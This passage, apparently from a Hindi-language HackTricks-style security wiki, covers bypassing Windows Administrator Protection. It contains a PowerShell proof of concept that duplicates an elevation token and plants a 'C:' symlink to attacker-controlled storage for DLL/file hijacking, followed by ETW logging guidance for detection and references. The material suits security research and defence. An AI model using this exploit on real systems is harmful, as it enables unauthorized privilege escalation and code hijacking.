3. वहां attacker-controlled storage की ओर संकेत करने वाला `C:` symlink बनाएं; इसके बाद उस session में होने वाले filesystem accesses `C:` को attacker path पर resolve करेंगे, जिससे बिना prompt के DLL/file hijack संभव होगा।

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Preview hosts पर, Administrator Protection `Microsoft-Windows-LUA` provider के अंतर्गत approvals और failures को ETW events **15031** और **15032** के रूप में रिकॉर्ड करता है। इन events में requester SID, application path, outcome, managed administrator account और authentication method शामिल होते हैं, इसलिए repeated exploit attempts या failed UI driving telemetry-free नहीं होते।<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – User Account Control कैसे काम करता है](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass techniques का संग्रह](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass compatibility scanner और launcher](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI ने PowerShell Backdoors बनाने के लिए AI अपनाया](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Southeast Asian Government Targets के विरुद्ध 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection को Bypass करना](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task का उपयोग करके UAC Bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent, TabTip और Narrator Always Notify bypasses](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
